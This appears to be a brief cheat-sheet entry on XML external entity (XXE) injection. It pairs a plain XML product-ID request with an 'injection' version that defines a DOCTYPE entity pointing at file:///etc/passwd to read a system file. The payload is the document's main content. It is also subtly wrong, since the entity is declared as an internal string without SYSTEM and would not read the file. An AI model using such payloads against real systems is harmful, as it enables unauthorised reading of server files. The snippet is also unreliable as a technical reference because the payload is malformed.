#xmli #xxe #xml

## Code
```xml
<?xml version="1.0" encoding="UTF-8"?>
<productId>1</productId>
```

## Injection
```xml
<?xml version="1.0"?>
<!DOCTYPE replace [<!ENTITY myVar 'file:///etc/passwd'>]>
<productId>&myVar;</productId>
```